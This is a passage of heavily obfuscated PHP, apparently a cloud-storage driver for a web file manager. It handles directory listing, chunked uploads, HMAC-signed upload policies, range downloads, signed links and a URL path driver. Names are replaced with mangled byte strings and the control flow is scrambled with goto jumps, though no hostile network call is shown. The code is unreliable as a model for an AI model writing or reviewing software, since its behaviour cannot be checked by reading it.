$bÃÎæÒßİ[$Bá¹¢³äÅº[1260]] : 0, $Bá¹¢³äÅº[77] => isset($eº‘â»Æ‘ø[$Bá¹¢³äÅº[325]]) ? $eº‘â»Æ‘ø[$Bá¹¢³äÅº[325]] : 0, $Bá¹¢³äÅº[160] => $this->ext($cÜÊ«ìñí), $Bá¹¢³äÅº[188] => !0, $Bá¹¢³äÅº[189] => !0); if (empty($eº‘â»Æ‘ø)) { $eº‘â»Æ‘ø = $this->objectMeta($cÜÊ«ìñí); if (!$eº‘â»Æ‘ø) { return $F‹İìñäÉŠ; } $F‹İìñäÉŠ[$Bá¹¢³äÅº[187]] = $eº‘â»Æ‘ø[$Bá¹¢³äÅº[1261]]; $F‹İìñäÉŠ[$Bá¹¢³äÅº[107]] = $eº‘â»Æ‘ø[$Bá¹¢³äÅº[1262]]; $F‹İìñäÉŠ[$Bá¹¢³äÅº[77]] = $eº‘â»Æ‘ø[$Bá¹¢³äÅº[77]]; } return $F‹İìñäÉŠ; } public function folderInfo($f¿Çµ¼´®², $Eó„šä¾‘ = false) { $Aí§Ëë£ùµ =& $_SERVER[¯Ò¬Èè]; if ($Eó„šä¾‘) { return array($Aí§Ëë£ùµ[28] => $this->pathThis($f¿Çµ¼´®²), $Aí§Ëë£ùµ[75] => $this->getPathOuter($Aí§Ëë£ùµ[8] . $f¿Çµ¼´®²), $Aí§Ëë£ùµ[29] => $Aí§Ëë£ùµ[76]); } $f–¶öæ–Ç­ = array($Aí§Ëë£ùµ[28] => $this->pathThis($f¿Çµ¼´®²), $Aí§Ëë£ùµ[75] => $this->getPathOuter($Aí§Ëë£ùµ[8] . $f¿Çµ¼´®²), $Aí§Ëë£ùµ[29] => $Aí§Ëë£ùµ[76], $Aí§Ëë£ùµ[187] => 0, $Aí§Ëë£ùµ[107] => isset($BÊò—ù¾ô[$Aí§Ëë£ùµ[1260]]) ? $BÊò—ù¾ô[$Aí§Ëë£ùµ[1260]] : 0, $Aí§Ëë£ùµ[1170] => !0, $Aí§Ëë£ùµ[1171] => !0); if (empty($DÔµæĞ)) { $DÔµæĞ = $this->objectMeta($f¿Çµ¼´®²); if (!$DÔµæĞ) { return $f–¶öæ–Ç­; } $f–¶öæ–Ç­[$Aí§Ëë£ùµ[187]] = $DÔµæĞ[$Aí§Ëë£ùµ[1261]]; $f–¶öæ–Ç­[$Aí§Ëë£ùµ[107]] = $DÔµæĞ[$Aí§Ëë£ùµ[1262]]; } return $f–¶öæ–Ç­; } private function fileList($BÎ†ÖÓ¡…‰, $B„›ß‹ŞÎÀ = 0, $E¥‰«­ç« = 1000) { $AˆÔšÍ‚Ÿö =& $_SERVER[¯Ò¬Èè]; $dî´–¡´Ê´ = array($AˆÔšÍ‚Ÿö[1263], $AˆÔšÍ‚Ÿö[1264] . $E¥‰«­ç«); if ($B„›ß‹ŞÎÀ) { $dî´–¡´Ê´[] = $AˆÔšÍ‚Ÿö[1265] . $B„›ß‹ŞÎÀ; } $eÑÉæ‘‰‘ = $this->ussRequest($BÎ†ÖÓ¡…‰, $AˆÔšÍ‚Ÿö[216], !1, $dî´–¡´Ê´); return !$eÑÉæ‘‰‘[$AˆÔšÍ‚Ÿö[1041]] ? !1 : $eÑÉæ‘‰‘[$AˆÔšÍ‚Ÿö[1043]]; } public function listPath($C²š‹ÍøŠ, $aáç‘œÕ‚ = false) { goto B…ª¾ªÔ—ñ; dœõŠË‰‹Õ: return array($FŠâÛ½¬Â[74] => $bùŞÚôœ™«, $FŠâÛ½¬Â[73] => $bîˆ¡º“ğÑ); goto b§ª–ëèÑô; C’Ç¡âŞ¥Î: $bùŞÚôœ™« = $bîˆ¡º“ğÑ = array(); $bÕéÈ° = rtrim($C²š‹ÍøŠ, $FŠâÛ½¬Â[8]) . $FŠâÛ½¬Â[8]; while (!0) { $dšÚ˜ÀÜß = $this->fileList($C²š‹ÍøŠ, $C³òŞªÕéá, $eÑ÷×Æò…); if (!$dšÚ˜ÀÜß) { return !1; } $C³òŞªÕéá = isset($dšÚ˜ÀÜß[$FŠâÛ½¬Â[1266]]) ? $dšÚ˜ÀÜß[$FŠâÛ½¬Â[1266]] : $FŠâÛ½¬Â[33]; $EÚ¦±Ê ™ˆ = isset($dšÚ˜ÀÜß[$FŠâÛ½¬Â[1267]]) ? $dšÚ˜ÀÜß[$FŠâÛ½¬Â[1267]] : array(); foreach ($EÚ¦±Ê ™ˆ as $bÙº¼‚·§) { if ($bÙº¼‚·§[$FŠâÛ½¬Â[29]] == $FŠâÛ½¬Â[76]) { $bùŞÚôœ™«[] = $this->folderInfo($bÕéÈ° . $bÙº¼‚·§[$FŠâÛ½¬Â[28]], $aáç‘œÕ‚, $bÙº¼‚·§); } else { $bîˆ¡º“ğÑ[] = $this->fileInfo($bÕéÈ° . $bÙº¼‚·§[$FŠâÛ½¬Â[28]], $aáç‘œÕ‚, $bÙº¼‚·§); } } if (count($EÚ¦±Ê ™ˆ) < $eÑ÷×Æò…) { break; } } goto dœõŠË‰‹Õ; B…ª¾ªÔ—ñ: $FŠâÛ½¬Â =& $_SERVER[¯Ò¬Èè]; $C³òŞªÕéá = $FŠâÛ½¬Â[33]; $eÑ÷×Æò… = 1000; goto C’Ç¡âŞ¥Î; b§ª–ëèÑô: } private function recursionAllFiles($bòÎùÊ‰ÂÎ, &$eò„â°íÎ) { $F˜¥‹ë«¤¡ =& $_SERVER[¯Ò¬Èè]; $EôØ…Ô–± = $F˜¥‹ë«¤¡[33]; $f¾Ê‘ìŞƒ = 1000; $f‚‡ÓŠÈ´ = $B¼ß°Ñôœï = array(); $bêêÎÊ¬  = rtrim($bòÎùÊ‰ÂÎ, $F˜¥‹ë«¤¡[8]) . $F˜¥‹ë«¤¡[8]; while (!0) { $C”—Úµ‰ = $this->fileList($bòÎùÊ‰ÂÎ, $EôØ…Ô–±, $f¾Ê‘ìŞƒ); if (!$C”—Úµ‰) { return !1; } $EôØ…Ô–± = isset($C”—Úµ‰[$F˜¥‹ë«¤¡[1266]]) ? $C”—Úµ‰[$F˜¥‹ë«¤¡[1266]] : $F˜¥‹ë«¤¡[33]; $BîÈ³¡ŸŞŸ = isset($C”—Úµ‰[$F˜¥‹ë«¤¡[1267]]) ? $C”—Úµ‰[$F˜¥‹ë«¤¡[1267]] : array(); foreach ($BîÈ³¡ŸŞŸ as $dÇ¹²õÁ) { $eñœš¸ãˆâ = array($F˜¥‹ë«¤¡[75] => $bêêÎÊ¬  . $dÇ¹²õÁ[$F˜¥‹ë«¤¡[28]], $F˜¥‹ë«¤¡[76] => $dÇ¹²õÁ[$F˜¥‹ë«¤¡[29]] == $F˜¥‹ë«¤¡[76] ? 1 : 0, $F˜¥‹ë«¤¡[77] => isset($dÇ¹²õÁ[$F˜¥‹ë«¤¡[325]]) ? $dÇ¹²õÁ[$F˜¥‹ë«¤¡[325]] : 0); $eò„â°íÎ[] = $eñœš¸ãˆâ; if ($eñœš¸ãˆâ[$F˜¥‹ë«¤¡[76]] == 1) { $this->recursionAllFiles($eñœš¸ãˆâ[$F˜¥‹ë«¤¡[75]], $eò„â°íÎ); } } if (count($BîÈ³¡ŸŞŸ) < $f¾Ê‘ìŞƒ) { break; } } } public function has($F‰±ÄÁŠˆø, $F•ßŠ—ßÉ¡ = false, $cÕÉÉöšÊ = true) { goto cºçâ™…; E¯ŸĞë‹õ„: $DË‚„ªï—Ï = 0; $Cœ°÷’ôáœ = 0; $DìŒğƒˆµÊ = rtrim($F‰±ÄÁŠˆø, $BŠµ¯Š¿èä[8]) . $BŠµ¯Š¿èä[8]; goto B¢ˆğÚÊ¦ó; cºçâ™…: $BŠµ¯Š¿èä =& $_SERVER[¯Ò¬Èè]; $bİ«î“££ = $BŠµ¯Š¿èä[33]; $CªŒ¡»‰ôŸ = 1000; goto E¯ŸĞë‹õ„; B¢ˆğÚÊ¦ó: while (!0) { $C¹ í½… = $this->fileList($F‰±ÄÁŠˆø, $bİ«î“££, $CªŒ¡»‰ôŸ); if (!$C¹ í½…) { return !1; } $bİ«î“££ = isset($C¹ í½…[$BŠµ¯Š¿èä[1266]]) ? $C¹ í½…[$BŠµ¯Š¿èä[1266]] : $BŠµ¯Š¿èä[33]; $f­õ‘ßê‹Õ = isset($C¹ í½…[$BŠµ¯Š¿èä[1267]]) ? $C¹ í½…[$BŠµ¯Š¿èä[1267]] : array(); if (empty($f­õ‘ßê‹Õ)) { break; } $e”è«Ã¶Óà = array_to_keyvalue($f­õ‘ßê‹Õ, $BŠµ¯Š¿èä[33], $BŠµ¯Š¿èä[29]); $D ìªÃ‘é = array_count_values($e”è«Ã¶Óà); $aÚƒ™Ê˜”… = isset($D ìªÃ‘é[$BŠµ¯Š¿èä[76]]) ? $D ìªÃ‘é[$BŠµ¯Š¿èä[76]] : 0; $a•ÕôÄ²§â = count($e”è«Ã¶Óà) - $aÚƒ™Ê˜”…; if ($F•ßŠ—ßÉ¡) { $Cœ°÷’ôáœ += $aÚƒ™Ê˜”…; $DË‚„ªï—Ï += $a•ÕôÄ²§â; if ($EŞÁ¦­½åŸ < $CªŒ¡»‰ôŸ) { break; } continue; } if ($cÕÉÉöšÊ) { if ($a•ÕôÄ²§â) { return !0; } } else { if ($aÚƒ™Ê˜”…) { return !0; } } if (count($f­õ‘ßê‹Õ) < $CªŒ¡»‰ôŸ) { break; } } if ($F•ßŠ—ßÉ¡) { return array($BŠµ¯Š¿èä[191] => $DË‚„ªï—Ï, $BŠµ¯Š¿èä[192] => $Cœ°÷’ôáœ); } return !1; goto A£‘¯›ğÎ‘; A£‘¯›ğÎ‘: } public function listAll($fœ£Å„ÖôÜ) { $B––ö‚ß¼¹ = array(); $this->recursionAllFiles($fœ£Å„ÖôÜ, $B––ö‚ß¼¹); return $B––ö‚ß¼¹; } public function canRead($fÖÍùó×ÈÔ) { return $this->exist($fÖÍùó×ÈÔ) ? !0 : !1; } public function canWrite($Aµ­ƒµ…†ã) { return $this->exist($Aµ­ƒµ…†ã) ? !0 : !1; } public function getContent($c»‚™¢öš) { return $this->fileSubstr($c»‚™¢öš, 0, -1); } public function setContent($e‰Í¼â”»“, $D©½«ñ±ƒ = '') { $AË†Ç‘‰—Ã =& $_SERVER[¯Ò¬Èè]; if (!$D©½«ñ±ƒ) { $F–¼Åƒğù = $this->ussRequest($e‰Í¼â”»“, $AË†Ç‘‰—Ã[212]); return $F–¼Åƒğù[$AË†Ç‘‰—Ã[1041]]; } $AŸäéÏ“¸ = $this->tempFile($this->pathThis($e‰Í¼â”»“)); file_put_contents($AŸäéÏ“¸, $D©½«ñ±ƒ); if ($this->upload($e‰Í¼â”»“, $AŸäéÏ“¸)) { $this->tempFileRemve($AŸäéÏ“¸); return !0; } return !1; } public function fileSubstr($C„èíªíèÜ, $F‡¢ğãÄè½, $CÌÓèè„í) { $a±Â‘ãƒŞ =& $_SERVER[¯Ò¬Èè]; if (!($d‘ÀİÖâ¨ = $this->link($C„èíªíèÜ))) { return !1; } $DÃ¡¢áèÛ‡ = !1; if ($CÌÓèè„í > 0) { $B„…œÃÄÍµ = $F‡¢ğãÄè½ + $CÌÓèè„í - 1; $DÃ¡¢áèÛ‡ = array($a±Â‘ãƒŞ[1228] . $F‡¢ğãÄè½ . $a±Â‘ãƒŞ[412] . $B„…œÃÄÍµ); } $B£Ñõİ·‚ = url_request($d‘ÀİÖâ¨, $a±Â‘ãƒŞ[216], !1, $DÃ¡¢áèÛ‡); return $B£Ñõİ·‚[$a±Â‘ãƒŞ[703]] ? $B£Ñõİ·‚[$a±Â‘ãƒŞ[1043]] : !1; } public function upload($Bå¬’°³é, $FÀ½‹°Œèè, $c–’§Òí’ = false, $Aóâ³ì¥Ç = REPEAT_REPLACE) { goto E£æÎ»ë¹; E£æÎ»ë¹: $cëõ©³°× =& $_SERVER[¯Ò¬Èè]; $aËìëòŠÅî = IO::size($FÀ½‹°Œèè); if ($aËìëòŠÅî <= 1024 * 1024 * 200) { $F³â½ÙáÄ = array($cëõ©³°×[1268] . $FÀ½‹°Œèè); $Eñµš¬Óé´ = $this->ussRequest($Bå¬’°³é, $cëõ©³°×[214], $F³â½ÙáÄ); return $Eñµš¬Óé´[$cëõ©³°×[1041]] ? $this->getPathOuter($Bå¬’°³é) : !1; } goto a‹¢³˜ÙŸŞ; côãË ÇÛ: if (!$Eñµš¬Óé´[$cëõ©³°×[1041]]) { return !1; } $AŠÈ„—˜Ÿï = $Eñµš¬Óé´[$cëõ©³°×[1043]]; $AŠñÚƒ¯Œ = 0; goto fãÆ¶¹Éï ; fãÆ¶¹Éï : $dÅø²ïê = $AŠÈ„—˜Ÿï[$cëõ©³°×[1273]]; $DÑ¿èÊ óê = fopen($FÀ½‹°Œèè, $cëõ©³°×[1178]); if (!$DÑ¿èÊ óê) { return !1; } goto d…÷Êœ““‡; b—¡œ—: $Eñµš¬Óé´ = $this->ussRequest($Bå¬’°³é, $cëõ©³°×[214], !1, $eÓ¦ÎÌŒˆ); return $Eñµš¬Óé´[$cëõ©³°×[1041]] ? $this->getPathOuter($d®å¯„¶ò) : !1; goto D»’±–Õ¹ß; d…÷Êœ““‡: do { $d”êµ•îÙ = $AŠÈ„—˜Ÿï[$cëõ©³°×[1274]]; fseek($DÑ¿èÊ óê, $AŠñÚƒ¯Œ); $Aàãè‡ùñÏ = fread($DÑ¿èÊ óê, $d”êµ•îÙ); $fö†ïƒÙÄ° = 0; do { $fö†ïƒÙÄ°++; $AŠÈ„—˜Ÿï = $this->uploadPart($Bå¬’°³é, $AŠÈ„—˜Ÿï, $Aàãè‡ùñÏ); } while (!$AŠÈ„—˜Ÿï && $fö†ïƒÙÄ° < 3); if (!$AŠÈ„—˜Ÿï) { return !1; } $dÅø²ïê = $AŠÈ„—˜Ÿï[$cëõ©³°×[1273]]; $AŠñÚƒ¯Œ += $d”êµ•îÙ; } while ($dÅø²ïê != -1); fclose($DÑ¿èÊ óê); $eÓ¦ÎÌŒˆ = array($cëõ©³°×[1275], $cëõ©³°×[1276] . $AŠÈ„—˜Ÿï[$cëõ©³°×[1277]], $cëõ©³°×[1271]); goto b—¡œ—; a‹¢³˜ÙŸŞ: $EµƒËÉÄšñ = 1024 * 1024 * 10; $eÓ¦ÎÌŒˆ = array($cëõ©³°×[1269], $cëõ©³°×[1270] . $aËìëòŠÅî, $cëõ©³°×[1271], $cëõ©³°×[1272] . $EµƒËÉÄšñ); $Eñµš¬Óé´ = $this->ussRequest($Bå¬’°³é, $cëõ©³°×[214], !1, $eÓ¦ÎÌŒˆ); goto côãË ÇÛ; D»’±–Õ¹ß: } private function uploadPart($Cí¸Ú Ğš©, $E ¤²ÊÍ¥˜, &$cåë‚âóÏ) { $Aêê¨ËöÂø =& $_SERVER[¯Ò¬Èè]; $EÏ£¦··òˆ = array($Aêê¨ËöÂø[1278], $Aêê¨ËöÂø[1276] . $E ¤²ÊÍ¥˜[$Aêê¨ËöÂø[1277]], $Aêê¨ËöÂø[1279] . $E ¤²ÊÍ¥˜[$Aêê¨ËöÂø[1273]], $Aêê¨ËöÂø[138] . $E ¤²ÊÍ¥˜[$Aêê¨ËöÂø[1274]]); $b·…ƒ¤÷ñ = $this->ussRequest($Cí¸Ú Ğš©, $Aêê¨ËöÂø[214], $cåë‚âóÏ, $EÏ£¦··òˆ); return !$b·…ƒ¤÷ñ[$Aêê¨ËöÂø[1041]] ? $b·…ƒ¤÷ñ[$Aêê¨ËöÂø[1041]] : $b·…ƒ¤÷ñ[$Aêê¨ËöÂø[1043]]; } public function uploadFormData($F¶—œ¾ä¹©, $DÁÙ®¶êã« = 3600) { return $this->uploadPolicy($F¶—œ¾ä¹©, $DÁÙ®¶êã«); } public function multiUploadFormData($eë¨¤ä™à¯, $BÃ´°ğì¤• = 3600) { $a¾»É‘œÊÉ =& $_SERVER[¯Ò¬Èè]; $còÆ¨óÒÕ = (int) $GLOBALS[$a¾»É‘œÊÉ[7]][$a¾»É‘œÊÉ[77]]; return $this->uploadPolicy($eë¨¤ä™à¯, $BÃ´°ğì¤•, $còÆ¨óÒÕ); } private function uploadPolicy($fº™™ö¨Øì, $câ¨’í©© = 3600, $aÕÄÜèŞ§› = 0) { goto A£ˆƒ˜ÌÛö; bôºğğ³•ƒ: $c£òø©ì•ƒ = base64_encode(hash_hmac($d•»êßÔ¿[1250], "\120\x4f\123\x54\x26{$f¼™’Ö‰}\46{$e„ïÒó†ø}\x26{$EŠæŠóËÓº}", md5("{$this->userpass}"), !0)); $dó°”Š”‚Ö = array($d•»êßÔ¿[1121] => $EŠæŠóËÓº, $d•»êßÔ¿[1284] => "\125\x50\x59\125\x4e\40{$this->username}\72{$c£òø©ì•ƒ}", $d•»êßÔ¿[169] => $this->endpoint . $f¼™’Ö‰); return $dó°”Š”‚Ö; goto CçÚ»×‡; A£ˆƒ˜ÌÛö: $d•»êßÔ¿ =& $_SERVER[¯Ò¬Èè]; $f¼™’Ö‰ = $d•»êßÔ¿[8] . $this->bucket; $e„ïÒó†ø = gmdate($d•»êßÔ¿[1213]); goto añ¾Œœáõ§; añ¾Œœáõ§: $fôÜñ–™ğ” = array($d•»êßÔ¿[1280] => $this->bucket, $d•»êßÔ¿[1281] => $fº™™ö¨Øì, $d•»êßÔ¿[1282] => time() + $câ¨’í©©, $d•»êßÔ¿[1283] => $e„ïÒó†ø); if ($aÕÄÜèŞ§›) { $fôÜñ–™ğ”[$d•»êßÔ¿[1199]] = $aÕÄÜèŞ§›; } $EŠæŠóËÓº = base64_encode(json_encode($fôÜñ–™ğ”)); goto bôºğğ³•ƒ; CçÚ»×‡: } public function download($EøÕ–”é½Š, $F§¼ôŠÊ­Û) { goto f‡›Œ›”ù; EŸš£óê: $E×ÜöŒ = 1024 * 200; $d‡­“¯¶‘ = fopen($bƒ µ¯¢É÷, $_SERVER[¯Ò¬Èè][1234]); while (!0) { $aòÄŒÄœ‘„ = $this->fileSubstr($EøÕ–”é½Š, $A·‡æêÂ±Ã, $E×ÜöŒ); if ($aòÄŒÄœ‘„ === !1) { return !1; } fwrite($d‡­“¯¶‘, $aòÄŒÄœ‘„); $A·‡æêÂ±Ã += $E×ÜöŒ; if (strlen($aòÄŒÄœ‘„) < $E×ÜöŒ) { break; } } goto aÀ¨œˆ²„”; f‡›Œ›”ù: $bƒ µ¯¢É÷ = IO::getPathInner(IO::mkfile($F§¼ôŠÊ­Û)); if (!($bµÜŒ…¼§Ğ = $this->link($EøÕ–”é½Š))) { return !1; } $A·‡æêÂ±Ã = 0; goto EŸš£óê; aÀ¨œˆ²„”: fclose($d‡­“¯¶‘); return $F§¼ôŠÊ­Û; goto CÇ„ğé¾â’; CÇ„ğé¾â’: } public function link($E„ÍÆï¼›ˆ, $dõ’«¸‹å = array()) { $fã‡™œŒ­ =& $_SERVER[¯Ò¬Èè]; $E„ÍÆï¼›ˆ = trim($E„ÍÆï¼›ˆ, $fã‡™œŒ­[8]); if (!empty($this->token)) { $F‡¡ÖëÎÁº = strtotime(date($fã‡™œŒ­[1285])); $a„¼õ ‚® = substr(md5($this->token . $fã‡™œŒ­[272] . $F‡¡ÖëÎÁº . $fã‡™œŒ­[1286] . $E„ÍÆï¼›ˆ), 12, 8) . $F‡¡ÖëÎÁº; $dõ’«¸‹å[] = $fã‡™œŒ­[1287] . $a„¼õ ‚®; } $C·ÃÓ¢ö = !empty($dõ’«¸‹å) ? $fã‡™œŒ­[69] . implode($fã‡™œŒ­[272], $dõ’«¸‹å) : $fã‡™œŒ­[33]; return $this->getHost() . $fã‡™œŒ­[8] . $E„ÍÆï¼›ˆ . $C·ÃÓ¢ö; } public function fileOut($dß¾”ñ¥Ÿ, $c‡æ° °› = false, $AÒÇÑ¼Ö‘ˆ = false, $A’Ô•ëõÒ = '') { if (!$AÒÇÑ¼Ö‘ˆ) { $AÒÇÑ¼Ö‘ˆ = $this->pathThis($dß¾”ñ¥Ÿ); } $CÌÕªô´Ö = $c‡æ° °› ? array($_SERVER[¯Ò¬Èè][1288] . rawurlencode($AÒÇÑ¼Ö‘ˆ)) : array(); $D¯ ‚È¢Å¡ = $this->link($dß¾”ñ¥Ÿ, $CÌÕªô´Ö); $this->fileOutLink($D¯ ‚È¢Å¡); } public function fileOutServer($E™àÓšöÃ”, $EÆ‚„…œ¦â = false, $DµêóÄ±Š  = false, $Fİ ­‰««ƒ = '') { parent::fileOut($E™àÓšöÃ”, $EÆ‚„…œ¦â, $DµêóÄ±Š , $Fİ ­‰««ƒ); } public function fileOutImage($a­¨Á…ÂùÑ, $E§Ã¡ÂÜŒ• = 250) { $aïÄ†çßë  = $this->link($a­¨Á…ÂùÑ . $_SERVER[¯Ò¬Èè][1289] . $E§Ã¡ÂÜŒ•); $this->fileOutLink($aïÄ†çßë ); } public function fileOutImageServer($FÉ›É¥šç, $AÅ´¨¼µ¹ = 250) { parent::fileOutImage($FÉ›É¥šç, $AÅ´¨¼µ¹); } public function hashMd5($CÌÁ·÷ÍÚ’) { $f‘½œ½Ş¼å =& $_SERVER[¯Ò¬Èè]; $b´†÷ÀùÓ  = $this->objectMeta($CÌÁ·÷ÍÚ’); return isset($b´†÷ÀùÓ [$f‘½œ½Ş¼å[196]]) ? $b´†÷ÀùÓ [$f‘½œ½Ş¼å[196]] : !1; } public function size($d÷…¦¿ùÛ¬) { $CÓÚËÓğ® = $this->objectMeta($d÷…¦¿ùÛ¬); return $CÓÚËÓğ® ? $CÓÚËÓğ®[$_SERVER[¯Ò¬Èè][77]] : 0; } public function info($CšÓ½ÈÇíÜ) { if ($this->isFolder($CšÓ½ÈÇíÜ)) { return $this->folderInfo($CšÓ½ÈÇíÜ); } else { if ($this->isFile($CšÓ½ÈÇíÜ)) { return $this->fileInfo($CšÓ½ÈÇíÜ); } } return !1; } public function exist($aÇ…Ş¶íì) { return $this->isFile($aÇ…Ş¶íì) || $this->isFolder($aÇ…Ş¶íì); } public function isFile($b×Å»‘ğË) { return !$this->isFolder($b×Å»‘ğË) && $this->objectMeta($b×Å»‘ğË); } public function isFolder($Aîø£îƒ‡±) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][223], $Aîø£îƒ‡±); } protected function objectMeta($eŠ‚©ÒÁ¯ª) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][224], $eŠ‚©ÒÁ¯ª); } protected function _objectMeta($a¶›ä‚ÌñŒ) { goto f¶…ÉºÀÖÏ; aº‹¨Ã·¹Â: if (!$e¿¹ÁŠá÷ö[$a­Àˆ…ø°Ù[1041]]) { return null; } $aª÷–æ‘…‹ = isset($e¿¹ÁŠá÷ö[$a­Àˆ…ø°Ù[1043]]) ? $e¿¹ÁŠá÷ö[$a­Àˆ…ø°Ù[1043]] : array(); if (!isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1291]])) { return null; } goto c›‰å”î§é; c›‰å”î§é: $aáÔ˜´“¶ = array($a­Àˆ…ø°Ù[28] => get_path_this($a¶›ä‚ÌñŒ), $a­Àˆ…ø°Ù[29] => isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1291]]) ? $aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1291]] : null, $a­Àˆ…ø°Ù[77] => isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1292]]) ? $aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1292]] : null, $a­Àˆ…ø°Ù[196] => isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1293]]) ? $aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1293]] : null, $a­Àˆ…ø°Ù[1261] => isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1294]]) ? $aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1294]] : null); $aáÔ˜´“¶[$a­Àˆ…ø°Ù[1262]] = isset($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1295]]) ? strtotime($aª÷–æ‘…‹[$a­Àˆ…ø°Ù[1295]]) : $aáÔ˜´“¶[$a­Àˆ…ø°Ù[1261]]; return $aáÔ˜´“¶; goto FÄØÕ¬…Ÿ; f¶…ÉºÀÖÏ: $a­Àˆ…ø°Ù =& $_SERVER[¯Ò¬Èè]; if ($a¶›ä‚ÌñŒ == $a­Àˆ…ø°Ù[33] || $a¶›ä‚ÌñŒ == $a­Àˆ…ø°Ù[8]) { return array(); } $e¿¹ÁŠá÷ö = $this->ussRequest($a¶›ä‚ÌñŒ, $a­Àˆ…ø°Ù[1290]); goto aº‹¨Ã·¹Â; FÄØÕ¬…Ÿ: } protected function _isFolder($aÅÊÒóäæ‡) { $E„‚áğœ× =& $_SERVER[¯Ò¬Èè]; if ($aÅÊÒóäæ‡ == $E„‚áğœ×[33] || $aÅÊÒóäæ‡ == $E„‚áğœ×[8]) { return !0; } $eÛÛ¯¦ªæ‡ = $this->objectMeta($aÅÊÒóäæ‡); return isset($eÛÛ¯¦ªæ‡[$E„‚áğœ×[29]]) && $eÛÛ¯¦ªæ‡[$E„‚áğœ×[29]] == $E„‚áğœ×[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($eÆ‡ĞÏò­ = false) { } public function exist($d­¤”¹¨ëœ) { $A¦É›©ÃÏ” = $this->info($d­¤”¹¨ëœ); return $A¦É›©ÃÏ”[$_SERVER[¯Ò¬Èè][188]]; } public function isFile($a“Î‹¶îöù) { $B˜ ·ÁÛæÃ = $this->info($a“Î‹¶îöù); return $B˜ ·ÁÛæÃ[$_SERVER[¯Ò¬Èè][188]]; } public function isFolder($dµº‘„½î¦) { return !1; } public function size($dÅª…´Êë) { $Dİ÷Á¢ÁÔÚ = $this->info($dÅª…´Êë); return $Dİ÷Á¢ÁÔÚ[$_SERVER[¯Ò¬Èè][77]]; } public function info($AÏ½»°­Çë) { return $this->infoParse($AÏ½»°­Çë); } public function infoAuth($CĞ¶Û…¶¥£) { return $this->infoParse($CĞ¶Û…¶¥£); } public function infoWithChildren($f¢Ñîï†¨’) { return $this->infoParse($f¢Ñîï†¨’); } public function infoFull($dËïĞ¡ç) { return $this->infoParse($dËïĞ¡ç); } private function infoParse($D¶„ö¬ßÈì) { $Eš‘¨Ö»Ç =& $_SERVER[¯Ò¬Èè]; $DªÁÎ²°± = $this->header($D¶„ö¬ßÈì); if (!$DªÁÎ²°± || !$DªÁÎ²°±[$Eš‘¨Ö»Ç[703]]) { return !1; } $cˆ†Ôª†„ = _get($DªÁÎ²°±, $Eš‘¨Ö»Ç[325], 0); $A¢ÜÓ¦Ó¶º = array($Eš‘¨Ö»Ç[28] => $DªÁÎ²°±[$Eš‘¨Ö»Ç[28]], $Eš‘¨Ö»Ç[75] => $D¶„ö¬ßÈì, $Eš‘¨Ö»Ç[29] => $Eš‘¨Ö»Ç[167], $Eš‘¨Ö»Ç[77] => intval($cˆ†Ôª†„), $Eš‘¨Ö»Ç[160] => get_path_ext($DªÁÎ²°±[$Eš‘¨Ö»Ç[28]]), $Eš‘¨Ö»Ç[1170] => $cˆ†Ôª†„ > 0 && $DªÁÎ²°±[$Eš‘¨Ö»Ç[1296]], $Eš‘¨Ö»Ç[1171] => !1); return $A¢ÜÓ¦Ó¶º; } private function header($cØƒÇíöã) { if (isset(self::$_cacheHeader[$cØƒÇíöã])) { return self::$_cacheHeader[$cØƒÇíöã]; } self::$_cacheHeader[$cØƒÇíöã] = url_header($cØƒÇíöã); return self::$_cacheHeader[$cØƒÇíöã]; } public function hashSimple($C²ó˜Ğ¾Ú», $FôÎ¨ØÄÄ = false) { goto eË™åˆâì; dô—Ø—ãñô: if ($cß‹Úõõ»á <= $F¾ÉÇñÌ¢Š * $C¤“å©¼–) { return md5($this->fileSubstr($C²ó˜Ğ¾Ú», 0, $cß‹Úõõ»á)) . $cß‹Úõõ»á; } $A¶Â¤„æ = intval($cß‹Úõõ»á / $C¤“å©¼–); $Bö”‹ó†•é = $C±ßâ¼Ùß[33]; goto c¸³æêÇ…˜; c¸³æêÇ…˜: $eµ¿¦š†è = timeFloat(); $cƒê°ğ¤ª = 15; for ($eóôèéÙÎ = 0; $eóôèéÙÎ < $C¤“å©¼–; $eóôèéÙÎ++) { if (timeFloat() - $eµ¿¦š†è > $cƒê°ğ¤ª) { return !1; } $fÌë’ÈºŞÎ = $this->fileSubstr($C²ó˜Ğ¾Ú», $A¶Â¤„æ * $eóôèéÙÎ, $F¾ÉÇñÌ¢Š); if (!$fÌë’ÈºŞÎ) { return !1; } $Bö”‹ó†•é .= $fÌë’ÈºŞÎ; } goto e¤×½Œß; aƒºõ½¢: $cß‹Úõõ»á = $eÖºÇë‹œœ[$C±ßâ¼Ùß[77]]; $F¾ÉÇñÌ¢Š = 200; $C¤“å©¼– = 50; goto dô—Ø—ãñô; eË™åˆâì: $C±ßâ¼Ùß =& $_SERVER[¯Ò¬Èè]; $eÖºÇë‹œœ = $this->info($C²ó˜Ğ¾Ú»); if (!$eÖºÇë‹œœ || !$eÖºÇë‹œœ[$C±ßâ¼Ùß[188]]) { return !1; } goto aƒºõ½¢; e¤×½Œß: $Bö”‹ó†•é .= $this->fileSubstr($C²ó˜Ğ¾Ú», $cß‹Úõõ»á - $F¾ÉÇñÌ¢Š, $F¾ÉÇñÌ¢Š); return md5($Bö”‹ó†•é) . $cß‹Úõõ»á; goto fªœöï¨ñ; fªœöï¨ñ: } public function getContent($d³˜³¥£ìˆ) { return $this->fileSubstr($d³˜³¥£ìˆ); } public function fileSubstr($DÑ­²ÀáÑ´, $FöšƒöŒóÈ = 0, $DÊ÷ÎŸÏÑì = -1) { goto FÖˆêîÒø§; FÖˆêîÒø§: $B­ãÅâ×Á =& $_SERVER[¯Ò¬Èè]; $C°±ƒÓÎõß = $this->info($DÑ­²ÀáÑ´); if (!$C°±ƒÓÎõß || !$C°±ƒÓÎõß[$B­ãÅâ×Á[188]] && 